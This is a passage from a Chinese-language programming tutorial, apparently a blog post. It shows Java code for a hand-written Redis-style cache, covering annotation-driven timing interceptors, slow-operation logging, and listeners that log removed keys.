&#125;</code></pre>

<p>那么如何判断方法是否加了注解</p>
<pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;
    Method[] methods = test.class.getMethods();
    <span class="hljs-keyword">for</span> (Method method : methods) &#123;
        System.out.println(method.getName());
        System.out.println(method.getAnnotation(CacheInterceptor.class));
    &#125;
&#125;</code></pre>

<p>如果方法上加了<code>@CacheInterceptor</code>注解，那么就能看到一下的打印信息</p>
<pre><code class="hljs kotlin">test2
<span class="hljs-literal">null</span>
test1
<span class="hljs-meta">@com</span>.sunzy.<span class="hljs-keyword">annotation</span>.CacheInterceptor(common=<span class="hljs-literal">true</span>)</code></pre>

<p>所以用这种方法判断，在哪些方法执行时，需要进行相应的处理。</p>
<h2 id="相关接口-3"><a href="#相关接口-3" class="headerlink" title="相关接口"></a>相关接口</h2><h3 id="ICacheInterceptorContext"><a href="#ICacheInterceptorContext" class="headerlink" title="ICacheInterceptorContext"></a>ICacheInterceptorContext</h3><p>为监听器执行时提供相关参数</p>
<pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">interface</span> <span class="hljs-title class_">ICacheInterceptorContext</span>&lt;K, V&gt;&#123;

    <span class="hljs-comment">/**</span>
<span class="hljs-comment">     * 缓存信息</span>
<span class="hljs-comment">     * <span class="hljs-doctag">@return</span> 缓存信息</span>
<span class="hljs-comment">     */</span>
    ICache&lt;K,V&gt; <span class="hljs-title function_">cache</span><span class="hljs-params">()</span>;

    <span class="hljs-comment">/**</span>
<span class="hljs-comment">     * 执行的方法信息</span>
<span class="hljs-comment">     * <span class="hljs-doctag">@return</span> 方法</span>
<span class="hljs-comment">     */</span>
    Method <span class="hljs-title function_">method</span><span class="hljs-params">()</span>;

    <span class="hljs-comment">/**</span>
<span class="hljs-comment">     * 执行的参数</span>
<span class="hljs-comment">     * <span class="hljs-doctag">@return</span> 参数</span>
<span class="hljs-comment">     */</span>
    Object[] params();

    <span class="hljs-comment">/**</span>
<span class="hljs-comment">     * 方法执行的结果</span>
<span class="hljs-comment">     * <span class="hljs-doctag">@return</span> 结果</span>
<span class="hljs-comment">     */</span>
    Object <span class="hljs-title function_">result</span><span class="hljs-params">()</span>;

    <span class="hljs-comment">/**</span>
<span class="hljs-comment">     * 开始时间</span>
<span class="hljs-comment">     * <span class="hljs-doctag">@return</span> 时间</span>
<span class="hljs-comment">     */</span>
    <span class="hljs-type">long</span> <span class="hljs-title function_">startMills</span><span class="hljs-params">()</span>;

    <span class="hljs-comment">/**</span>
<span class="hljs-comment">     * 结束时间</span>
<span class="hljs-comment">     * <span class="hljs-doctag">@return</span> 时间</span>
<span class="hljs-comment">     */</span>
    <span class="hljs-type">long</span> <span class="hljs-title function_">endMills</span><span class="hljs-params">()</span>;
&#125;</code></pre>

<h3 id="ICacheInterceptor"><a href="#ICacheInterceptor" class="headerlink" title="ICacheInterceptor"></a>ICacheInterceptor</h3><p>在执行方法前后需要执行的操作</p>
<pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">interface</span> <span class="hljs-title class_">ICacheInterceptor</span>&lt;K,V&gt; &#123;

    <span class="hljs-comment">/**</span>
<span class="hljs-comment">     * 方法执行之前</span>
<span class="hljs-comment">     * <span class="hljs-doctag">@param</span> context 上下文</span>
<span class="hljs-comment">     */</span>
    <span class="hljs-keyword">void</span> <span class="hljs-title function_">before</span><span class="hljs-params">(ICacheInterceptorContext&lt;K,V&gt; context)</span>;

    <span class="hljs-comment">/**</span>
<span class="hljs-comment">     * 方法执行之后</span>
<span class="hljs-comment">     * <span class="hljs-doctag">@param</span> context 上下文</span>
<span class="hljs-comment">     */</span>
    <span class="hljs-keyword">void</span> <span class="hljs-title function_">after</span><span class="hljs-params">(ICacheInterceptorContext&lt;K,V&gt; context)</span>;

&#125;</code></pre>

<h2 id="接口实现类"><a href="#接口实现类" class="headerlink" title="接口实现类"></a>接口实现类</h2><h3 id="CacheInterceptorCost"><a href="#CacheInterceptorCost" class="headerlink" title="CacheInterceptorCost"></a>CacheInterceptorCost</h3><p>执行耗时统计监听器，再添加一个慢日志阈值即可实现判断是否为慢操作</p>
<pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">CacheInterceptorCost</span>&lt;K, V&gt; <span class="hljs-keyword">implements</span> <span class="hljs-title class_">ICacheInterceptor</span>&lt;K, V&gt; &#123;
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">Log</span> <span class="hljs-variable">log</span> <span class="hljs-operator">=</span> LogFactory.getLog(CacheInterceptorCost.class);

    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">before</span><span class="hljs-params">(ICacheInterceptorContext&lt;K, V&gt; context)</span> &#123;
        log.debug(<span class="hljs-string">&quot;Cost start, method: &#123;&#125;&quot;</span>, context.method().getName());
    &#125;

    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">after</span><span class="hljs-params">(ICacheInterceptorContext&lt;K, V&gt; context)</span> &#123;
        <span class="hljs-type">long</span> <span class="hljs-variable">costMills</span> <span class="hljs-operator">=</span> context.endMills() - context.startMills();
        <span class="hljs-type">String</span> <span class="hljs-variable">methodName</span> <span class="hljs-operator">=</span> context.method().getName();
        log.debug(<span class="hljs-string">&quot;Cost end, method: &#123;&#125;, cost: &#123;&#125;ms&quot;</span>, methodName, costMills);

        <span class="hljs-comment">// 添加慢操作日志</span>
        List&lt;ICacheSlowListener&gt; slowListenerList = context.cache().slowListeners();
        <span class="hljs-keyword">if</span> (CollectionUtil.isNotEmpty(slowListenerList))&#123;
            <span class="hljs-type">CacheSlowListenerContext</span> <span class="hljs-variable">listenerContext</span> <span class="hljs-operator">=</span> CacheSlowListenerContext.newInstance()
                    .startTimeMills(context.startMills())
                    .endTimeMills(context.endMills())
                    .costTimeMills(costMills)
                    .methodName(methodName)
                    .params(context.params())
                    .result(context.result());
            <span class="hljs-keyword">for</span> (ICacheSlowListener slowListener : slowListenerList) &#123;
                <span class="hljs-comment">// 超过慢日志的阈值 则认定为满操作</span>
                <span class="hljs-keyword">if</span>(costMills &gt;= slowListener.slowerThanMills())&#123;
                    slowListener.listen(listenerContext);
                &#125;
            &#125;
        &#125;

    &#125;
&#125;</code></pre>



<h3 id="CacheInterceptorContext"><a href="#CacheInterceptorContext" class="headerlink" title="CacheInterceptorContext"></a>CacheInterceptorContext</h3><p>监听器执行的上下文</p>
<pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">CacheInterceptorContext</span>&lt;K,V&gt; <span class="hljs-keyword">implements</span> <span class="hljs-title class_">ICacheInterceptorContext</span>&lt;K,V&gt; &#123;

    <span class="hljs-keyword">private</span> ICache&lt;K,V&gt; cache;

    <span class="hljs-comment">/**</span>
<span class="hljs-comment">     * 执行的方法信息</span>
<span class="hljs-comment">     */</span>
    <span class="hljs-keyword">private</span> Method method;

    <span class="hljs-comment">/**</span>
<span class="hljs-comment">     * 执行的参数</span>
<span class="hljs-comment">     */</span>
    <span class="hljs-keyword">private</span> Object[] params;

    <span class="hljs-comment">/**</span>
<span class="hljs-comment">     * 方法执行的结果</span>
<span class="hljs-comment">     */</span>
    <span class="hljs-keyword">private</span> Object result;

    <span class="hljs-comment">/**</span>
<span class="hljs-comment">     * 开始时间</span>
<span class="hljs-comment">     */</span>
    <span class="hljs-keyword">private</span> <span class="hljs-type">long</span> startMills;

    <span class="hljs-comment">/**</span>
<span class="hljs-comment">     * 结束时间</span>
<span class="hljs-comment">     */</span>
    <span class="hljs-keyword">private</span> <span class="hljs-type">long</span> endMills;

    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> &lt;K,V&gt; CacheInterceptorContext&lt;K,V&gt; <span class="hljs-title function_">newInstance</span><span class="hljs-params">()</span> &#123;
        <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">CacheInterceptorContext</span>&lt;&gt;();
    &#125;

    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">public</span> ICache&lt;K, V&gt; <span class="hljs-title function_">cache</span><span class="hljs-params">()</span> &#123;
        <span class="hljs-keyword">return</span> cache;
    &#125;

    <span class="hljs-keyword">public</span> CacheInterceptorContext&lt;K, V&gt; <span class="hljs-title function_">cache</span><span class="hljs-params">(ICache&lt;K, V&gt; cache)</span> &#123;
        <span class="hljs-built_in">this</span>.cache = cache;
        <span class="hljs-keyword">return</span> <span class="hljs-built_in">this</span>;
    &#125;

    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">public</span> Method <span class="hljs-title function_">method</span><span class="hljs-params">()</span> &#123;
        <span class="hljs-keyword">return</span> method;
    &#125;

    <span class="hljs-keyword">public</span> CacheInterceptorContext&lt;K, V&gt; <span class="hljs-title function_">method</span><span class="hljs-params">(Method method)</span> &#123;
        <span class="hljs-built_in">this</span>.method = method;
        <span class="hljs-keyword">return</span> <span class="hljs-built_in">this</span>;
    &#125;

    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">public</span> Object[] params() &#123;
        <span class="hljs-keyword">return</span> params;
    &#125;

    <span class="hljs-keyword">public</span> CacheInterceptorContext&lt;K, V&gt; <span class="hljs-title function_">params</span><span class="hljs-params">(Object[] params)</span> &#123;
        <span class="hljs-built_in">this</span>.params = params;
        <span class="hljs-keyword">return</span> <span class="hljs-built_in">this</span>;
    &#125;

    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">public</span> Object <span class="hljs-title function_">result</span><span class="hljs-params">()</span> &#123;
        <span class="hljs-keyword">return</span> result;
    &#125;

    <span class="hljs-keyword">public</span> CacheInterceptorContext&lt;K, V&gt; <span class="hljs-title function_">result</span><span class="hljs-params">(Object result)</span> &#123;
        <span class="hljs-built_in">this</span>.result = result;
        <span class="hljs-keyword">return</span> <span class="hljs-built_in">this</span>;
    &#125;

    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">public</span> <span class="hljs-type">long</span> <span class="hljs-title function_">startMills</span><span class="hljs-params">()</span> &#123;
        <span class="hljs-keyword">return</span> startMills;
    &#125;

    <span class="hljs-keyword">public</span> CacheInterceptorContext&lt;K, V&gt; <span class="hljs-title function_">startMills</span><span class="hljs-params">(<span class="hljs-type">long</span> startMills)</span> &#123;
        <span class="hljs-built_in">this</span>.startMills = startMills;
        <span class="hljs-keyword">return</span> <span class="hljs-built_in">this</span>;
    &#125;

    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">public</span> <span class="hljs-type">long</span> <span class="hljs-title function_">endMills</span><span class="hljs-params">()</span> &#123;
        <span class="hljs-keyword">return</span> endMills;
    &#125;

    <span class="hljs-keyword">public</span> CacheInterceptorContext&lt;K, V&gt; <span class="hljs-title function_">endMills</span><span class="hljs-params">(<span class="hljs-type">long</span> endMills)</span> &#123;
        <span class="hljs-built_in">this</span>.endMills = endMills;
        <span class="hljs-keyword">return</span> <span class="hljs-built_in">this</span>;
    &#125;
&#125;</code></pre>

<h3 id="CacheProxyBs"><a href="#CacheProxyBs" class="headerlink" title="CacheProxyBs"></a>CacheProxyBs</h3><p>在CacheProxyBs添加相关监听器</p>
<pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">CacheProxyBs</span> &#123;

    <span class="hljs-keyword">private</span> <span class="hljs-title function_">CacheProxyBs</span><span class="hljs-params">()</span>&#123;&#125;
    <span class="hljs-comment">/**</span>
<span class="hljs-comment">     * 代理上下文</span>
<span class="hljs-comment">     */</span>
    <span class="hljs-keyword">private</span> ICacheProxyBsContext context;
    
    <span class="hljs-comment">/**</span>
<span class="hljs-comment">     * 默认通用拦截器</span>
<span class="hljs-comment">     *</span>
<span class="hljs-comment">     * JDK 的泛型擦除导致这里不能使用泛型</span>
<span class="hljs-comment">     */</span>
    <span class="hljs-meta">@SuppressWarnings(&quot;all&quot;)</span>
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> List&lt;ICacheInterceptor&gt; commonInterceptors = CacheInterceptors.defaultCommonList();


    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> CacheProxyBs <span class="hljs-title function_">newInstance</span><span class="hljs-params">()</span>&#123;
        <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">CacheProxyBs</span>();
    &#125;

    <span class="hljs-keyword">public</span> CacheProxyBs <span class="hljs-title function_">context</span><span class="hljs-params">(ICacheProxyBsContext context)</span> &#123;
        <span class="hljs-built_in">this</span>.context = context;
        <span class="hljs-keyword">return</span> <span class="hljs-built_in">this</span>;
    &#125;

    <span class="hljs-comment">/**</span>
<span class="hljs-comment">     * 该方法在每个方法执行之前会获取其执行的具体信息</span>
<span class="hljs-comment">     * 包括执方法名，参数，执行结果，执行结果</span>
<span class="hljs-comment">     * 在执行前会打印执行时间</span>
<span class="hljs-comment">     * 然后记录执行时间</span>
<span class="hljs-comment">     * 打印最后的执行时间</span>
<span class="hljs-comment">     * <span class="hljs-doctag">@return</span></span>
<span class="hljs-comment">     * <span class="hljs-doctag">@throws</span> Throwable</span>
<span class="hljs-comment">     */</span>
    <span class="hljs-meta">@SuppressWarnings(&quot;all&quot;)</span>
    <span class="hljs-keyword">public</span> Object <span class="hljs-title function_">execute</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> Throwable &#123;
        <span class="hljs-type">long</span> <span class="hljs-variable">startMills</span> <span class="hljs-operator">=</span> System.currentTimeMillis();
        <span class="hljs-keyword">final</span> <span class="hljs-type">ICache</span> <span class="hljs-variable">cache</span> <span class="hljs-operator">=</span> context.target();
        <span class="hljs-type">Object</span> <span class="hljs-variable">result</span> <span class="hljs-operator">=</span> context.process();
        <span class="hljs-keyword">return</span> result;
    &#125;
&#125;</code></pre>

<p>通过注解判断，需要执行什么监听器</p>
<pre><code class="hljs java"> <span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">interceptorHandler</span><span class="hljs-params">(CacheInterceptor cacheInterceptor,</span>
<span class="hljs-params">                                    CacheInterceptorContext interceptorContext,</span>
<span class="hljs-params">                                    ICache cache,</span>
<span class="hljs-params">                                    <span class="hljs-type">boolean</span> before)</span> &#123;
     <span class="hljs-keyword">if</span>(cacheInterceptor != <span class="hljs-literal">null</span>) &#123;
         <span class="hljs-comment">//1. 通用</span>
         <span class="hljs-keyword">if</span>(cacheInterceptor.common()) &#123;
             <span class="hljs-keyword">for</span>(ICacheInterceptor interceptor : commonInterceptors) &#123;
                 <span class="hljs-keyword">if</span>(before) &#123;
                     interceptor.before(interceptorContext);
                 &#125; <span class="hljs-keyword">else</span> &#123;
                     interceptor.after(interceptorContext);
                 &#125;
             &#125;
         &#125;
     &#125;
&#125;</code></pre>

<p>修改代理对象调用的方法<code>execute()</code></p>
<pre><code class="hljs java"><span class="hljs-keyword">public</span> Object <span class="hljs-title function_">execute</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> Throwable &#123;
    <span class="hljs-comment">//1. 开始的时间</span>
    <span class="hljs-keyword">final</span> <span class="hljs-type">long</span> <span class="hljs-variable">startMills</span> <span class="hljs-operator">=</span> System.currentTimeMillis();
    <span class="hljs-keyword">final</span> <span class="hljs-type">ICache</span> <span class="hljs-variable">cache</span> <span class="hljs-operator">=</span> context.target();
    <span class="hljs-type">CacheInterceptorContext</span> <span class="hljs-variable">interceptorContext</span> <span class="hljs-operator">=</span> CacheInterceptorContext.newInstance()
        .startMills(startMills)
        .method(context.method())
        .params(context.params())
        .cache(context.target());

    <span class="hljs-comment">//1. 获取刷新注解信息</span>
    <span class="hljs-type">CacheInterceptor</span> <span class="hljs-variable">cacheInterceptor</span> <span class="hljs-operator">=</span> context.interceptor();
    <span class="hljs-built_in">this</span>.interceptorHandler(cacheInterceptor, interceptorContext, cache, <span class="hljs-literal">true</span>);

    <span class="hljs-comment">//2. 正常执行</span>
    <span class="hljs-type">Object</span> <span class="hljs-variable">result</span> <span class="hljs-operator">=</span> context.process();

    <span class="hljs-keyword">final</span> <span class="hljs-type">long</span> <span class="hljs-variable">endMills</span> <span class="hljs-operator">=</span> System.currentTimeMillis();
    interceptorContext.endMills(endMills).result(result);

    <span class="hljs-comment">// 方法执行完成</span>
    <span class="hljs-built_in">this</span>.interceptorHandler(cacheInterceptor, interceptorContext, cache, <span class="hljs-literal">false</span>);
    <span class="hljs-keyword">return</span> result;
&#125;</code></pre>

<h3 id="CacheBs-1"><a href="#CacheBs-1" class="headerlink" title="CacheBs"></a>CacheBs</h3><p>修改引导类对象中的<code>build()</code>方法</p>
<pre><code class="hljs java"><span class="hljs-keyword">public</span> ICache&lt;K,V&gt; <span class="hljs-title function_">build</span><span class="hljs-params">()</span> &#123;
    Cache&lt;K,V&gt; cache = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Cache</span>&lt;&gt;();
    cache.map(map);
    cache.evict(evict);
    cache.sizeLimit(size);

    <span class="hljs-comment">// 初始化</span>
    cache.init();
    <span class="hljs-comment">// 创建代理对象</span>
    <span class="hljs-keyword">return</span> CacheProxy.getProxy(cache);
&#125;</code></pre>

<h2 id="测试-1"><a href="#测试-1" class="headerlink" title="测试"></a>测试</h2><pre><code class="hljs java">ICache&lt;String, String&gt; cache = CacheBs.&lt;String,String&gt;newInstance()
        .size(<span class="hljs-number">3</span>)
        .build();
cache.put(<span class="hljs-string">&quot;1&quot;</span>, <span class="hljs-string">&quot;1&quot;</span>);
cache.put(<span class="hljs-string">&quot;2&quot;</span>, <span class="hljs-string">&quot;2&quot;</span>);

cache.expire(<span class="hljs-string">&quot;1&quot;</span>, <span class="hljs-number">10</span>);
TimeUnit.MILLISECONDS.sleep(<span class="hljs-number">50</span>);

System.out.println(cache.keySet());</code></pre>



<h1 id="持久化"><a href="#持久化" class="headerlink" title="持久化"></a>持久化</h1><p>redis的持久化有两种RDB和AOF，由于项目中这两种方案的实现比较简陋，就不在此多介绍了</p>
<p>可以看这篇</p>
<p><a href="https://mp.weixin.qq.com/s?__biz=MzUyNjE3OTAyMw==&mid=2247484394&idx=1&sn=b28bab43fbcbb716b1962a91eafaaddb&chksm=fa138c4acd64055cac562dc8ceaade6af5d51d5eda5a9f138837ab408b34a2b1b7e07750ad96&cur_album_id=1537245724881567745&scene=189#wechat_redirect">从零手写实现redis（三）内存数据如何重启不丢失？ (qq.com)</a></p>
<h1 id="数据删除监听器"><a href="#数据删除监听器" class="headerlink" title="数据删除监听器"></a>数据删除监听器</h1><p>当 有数据被从cache中删除时，在控制台中打印出详细信息，这就涉及到两种删除操作</p>
<ul>
<li>当cache容量已满，数据被淘汰</li>
<li>设置过期时间的key，到达过期时间</li>
</ul>
<p>所以需要针对以上两种添加监听器</p>
<h2 id="相关接口-4"><a href="#相关接口-4" class="headerlink" title="相关接口"></a>相关接口</h2><h3 id="ICacheRemoveListener"><a href="#ICacheRemoveListener" class="headerlink" title="ICacheRemoveListener"></a>ICacheRemoveListener</h3><p>将监听器抽象成一个接口，方便后续添加不同的监听器</p>
<pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">interface</span> <span class="hljs-title class_">ICacheRemoveListener</span>&lt;K,V&gt; &#123;

    <span class="hljs-comment">/**</span>
<span class="hljs-comment">     * 监听</span>
<span class="hljs-comment">     * <span class="hljs-doctag">@param</span> context 上下文</span>
<span class="hljs-comment">     */</span>
    <span class="hljs-keyword">void</span> <span class="hljs-title function_">listen</span><span class="hljs-params">(<span class="hljs-keyword">final</span> ICacheRemoveListenerContext&lt;K,V&gt; context)</span>;

&#125;
</code></pre>

<h3 id="ICacheRemoveListenerContext"><a href="#ICacheRemoveListenerContext" class="headerlink" title="ICacheRemoveListenerContext"></a>ICacheRemoveListenerContext</h3><p>监听器执行时需要的参数</p>
<pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">interface</span> <span class="hljs-title class_">ICacheRemoveListenerContext</span>&lt;K,V&gt; &#123;

    <span class="hljs-comment">/**</span>
<span class="hljs-comment">     * 清空的 key</span>
<span class="hljs-comment">     * <span class="hljs-doctag">@return</span> key</span>
<span class="hljs-comment">     */</span>
    K <span class="hljs-title function_">key</span><span class="hljs-params">()</span>;

    <span class="hljs-comment">/**</span>
<span class="hljs-comment">     * 值</span>
<span class="hljs-comment">     * <span class="hljs-doctag">@return</span> 值</span>
<span class="hljs-comment">     */</span>
    V <span class="hljs-title function_">value</span><span class="hljs-params">()</span>;

    <span class="hljs-comment">/**</span>
<span class="hljs-comment">     * 删除类型</span>
<span class="hljs-comment">     * <span class="hljs-doctag">@return</span> 类型</span>
<span class="hljs-comment">     */</span>
    String <span class="hljs-title function_">type</span><span class="hljs-params">()</span>;

&#125;</code></pre>

<h2 id="接口实现-1"><a href="#接口实现-1" class="headerlink" title="接口实现"></a>接口实现</h2><h3 id="CacheRemoveListener"><a href="#CacheRemoveListener" class="headerlink" title="CacheRemoveListener"></a>CacheRemoveListener</h3><p>移除操作的实现比较简单，当有key被删除时，在控制台中打印出本次操作的key,value以及移除的类型(evict，expire)，所以还需要一个枚举类，来表示操作的类型。</p>
<pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">CacheRemoveListener</span>&lt;K,V&gt; <span class="hljs-keyword">implements</span> <span class="hljs-title class_">ICacheRemoveListener</span>&lt;K,V&gt; &#123;

    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">Log</span> <span class="hljs-variable">log</span> <span class="hljs-operator">=</span> LogFactory.getLog(CacheRemoveListener.class);

    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">listen</span><span class="hljs-params">(ICacheRemoveListenerContext&lt;K, V&gt; context)</span> &#123;
        log.debug(<span class="hljs-string">&quot;Remove key: &#123;&#125;, value: &#123;&#125;, type: &#123;&#125;&quot;</span>,
                context.key(), context.value(), context.type());
    &#125;

&#125;</code></pre>

<h3 id="CacheRemoveListenerContext"><a href="#CacheRemoveListenerContext" class="headerlink" title="CacheRemoveListenerContext"></a>CacheRemoveListenerContext</h3><p>CacheRemoveListenerContext该类的实现比较简单，就是给成员变量赋值即可，并且用到了单例模式</p>
<pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">CacheRemoveListenerContext</span>&lt;K,V&gt; <span class="hljs-keyword">implements</span> <span class="hljs-title class_">ICacheRemoveListenerContext</span>&lt;K,V&gt; &#123;

    <span class="hljs-comment">/**</span>
<span class="hljs-comment">     * key</span>
<span class="hljs-comment">     */</span>
    <span class="hljs-keyword">private</span> K key;

    <span class="hljs-comment">/**</span>
<span class="hljs-comment">     * 值</span>
<span class="hljs-comment">     */</span>
    <span class="hljs-keyword">private</span> V value;

    <span class="hljs-comment">/**</span>
<span class="hljs-comment">     * 删除类型</span>
<span class="hljs-comment">     */</span>
    <span class="hljs-keyword">private</span> String type;

    <span class="hljs-comment">/**</span>
<span class="hljs-comment">     * 新建实例</span>
<span class="hljs-comment">     * <span class="hljs-doctag">@param</span> &lt;K&gt; key</span>
<span class="hljs-comment">     * <span class="hljs-doctag">@param</span> &lt;V&gt; value</span>
<span class="hljs-comment">     * <span class="hljs-doctag">@since</span> 0.0.6</span>
<span class="hljs-comment">     */</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> &lt;K,V&gt; CacheRemoveListenerContext&lt;K,V&gt; <span class="hljs-title function_">newInstance</span><span class="hljs-params">()</span> &#123;
        <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">CacheRemoveListenerContext</span>&lt;&gt;();
    &#125;

    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">public</span> K <span class="hljs-title function_">key</span><span class="hljs-params">()</span> &#123;
        <span class="hljs-keyword">return</span> key;
    &#125;

    <span class="hljs-keyword">public</span> CacheRemoveListenerContext&lt;K, V&gt; <span class="hljs-title function_">key</span><span class="hljs-params">(K key)</span> &#123;
        <span class="hljs-built_in">this</span>.key = key;
        <span class="hljs-keyword">return</span> <span class="hljs-built_in">this</span>;
    &#125;

    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">public</span> V <span class="hljs-title function_">value</span><span class="hljs-params">()</span> &#123;
        <span class="hljs-keyword">return</span> value;
    &#125;

    <span class="hljs-keyword">public</span> CacheRemoveListenerContext&lt;K, V&gt; <span class="hljs-title function_">value</span><span class="hljs-params">(V value)</span> &#123;
        <span class="hljs-built_in">this</span>.value = value;
        <span class="hljs-keyword">return</span> <span class="hljs-built_in">this</span>;
    &#125;

    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">type</span><span class="hljs-params">()</span> &#123;
        <span class="hljs-keyword">return</span> type;
    &#125;

    <span class="hljs-keyword">public</span> CacheRemoveListenerContext&lt;K, V&gt; <span class="hljs-title function_">type</span><span class="hljs-params">(String type)</span> &#123;
        <span class="hljs-built_in">this</span>.type = type;
        <span class="hljs-keyword">return</span> <span class="hljs-built_in">this</span>;
    &#125;
&#125;</code></pre>

<h3 id="CacheRemoveType"><a href="#CacheRemoveType" class="headerlink" title="CacheRemoveType"></a>CacheRemoveType</h3><p>表示移除类型的枚举类</p>
<pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">enum</span> <span class="hljs-title class_">CacheRemoveType</span> &#123;
    EXPIRE(<span class="hljs-string">&quot;expire&quot;</span>, <span class="hljs-string">&quot;过期&quot;</span>),
    EVICT(<span class="hljs-string">&quot;evict&quot;</span>, <span class="hljs-string">&quot;淘汰&quot;</span>),
    ;

    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> String code;

    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> String desc;


    CacheRemoveType(String code, String desc) &#123;
        <span class="hljs-built_in">this</span>.code = code;
        <span class="hljs-built_in">this</span>.desc = desc;
    &#125;

    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">code</span><span class="hljs-params">()</span> &#123;
        <span class="hljs-keyword">return</span> code;
    &#125;

    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">desc</span><span class="hljs-params">()</span> &#123;
        <span class="hljs-keyword">return</span> desc;
    &#125;

    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">toString</span><span class="hljs-params">()</span> &#123;
        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;CacheRemoveType&#123;&quot;</span> +
                <span class="hljs-string">&quot;code=&#x27;&quot;</span> + code + <span class="hljs-string">&#x27;\&#x27;&#x27;</span> +
                <span class="hljs-string">&quot;, desc=&#x27;&quot;</span> + desc + <span class="hljs-string">&#x27;\&#x27;&#x27;</span> +
                <span class="hljs-string">&#x27;&#125;&#x27;</span>;
    &#125;

&#125;</code></pre>

<p>因为同类型的监听器可能有多种，所以需要创建一个获取该类型监听器的工厂类</p>
<h3 id="CacheRemoveListeners"><a href="#CacheRemoveListeners" class="headerlink" title="CacheRemoveListeners"></a>CacheRemoveListeners</h3><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">CacheRemoveListeners</span> &#123;

    <span class="hljs-keyword">private</span> <span class="hljs-title function_">CacheRemoveListeners</span><span class="hljs-params">()</span>&#123;&#125;

    <span class="hljs-comment">/**</span>
<span class="hljs-comment">     * 默认监听类</span>
<span class="hljs-comment">     * <span class="hljs-doctag">@return</span> 监听类列表</span>
<span class="hljs-comment">     * <span class="hljs-doctag">@param</span> &lt;K&gt; key</span>
<span class="hljs-comment">     * <span class="hljs-doctag">@param</span> &lt;V&gt; value</span>
<span class="hljs-comment">     */</span>
    <span class="hljs-meta">@SuppressWarnings(&quot;all&quot;)</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> &lt;K,V&gt; List&lt;ICacheRemoveListener&lt;K,V&gt;&gt; <span class="hljs-title function_">defaults</span><span class="hljs-params">()</span> &#123;
        List&lt;ICacheRemoveListener&lt;K,V&gt;&gt; listeners = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayList</span>&lt;&gt;();
        listeners.add(<span class="hljs-keyword">new</span> <span class="hljs-title class_">CacheRemoveListener</span>());
        <span class="hljs-keyword">return</span> listeners;
    &#125;

&#125;</code></pre>

<p>所有准备工作都做完后，接下来就是将监听器加入到cache中</p>
<p>在cache和cacheBs中添加成员变量</p>
<p>cache中代码</p>
<pre><code class="hljs java"><span class="hljs-comment">/**</span>
<span class="hljs-comment"> * 删除监听类</span>
<span class="hljs-comment"> */</span>
<span class="hljs-keyword">private</span> List&lt;ICacheRemoveListener&lt;K,V&gt;&gt; removeListeners;

<span class="hljs-meta">@Override</span>
<span class="hljs-keyword">public</span> List&lt;ICacheRemoveListener&lt;K, V&gt;&gt; <span class="hljs-title function_">removeListeners</span><span class="hljs-params">()</span> &#123;
    <span class="hljs-keyword">return</span> removeListeners;
&#125;

<span class="hljs-keyword">public</span> Cache&lt;K, V&gt; <span class="hljs-title function_">removeListeners</span><span class="hljs-params">(List&lt;ICacheRemoveListener&lt;K, V&gt;&gt; removeListeners)</span> &#123;
    <span class="hljs-built_in">this</span>.removeListeners = removeListeners;
    <span class="hljs-keyword">return</span> <span class="hljs-built_in">this</span>;
&#125;
</code></pre>

<p>cacheBs中的代码</p>
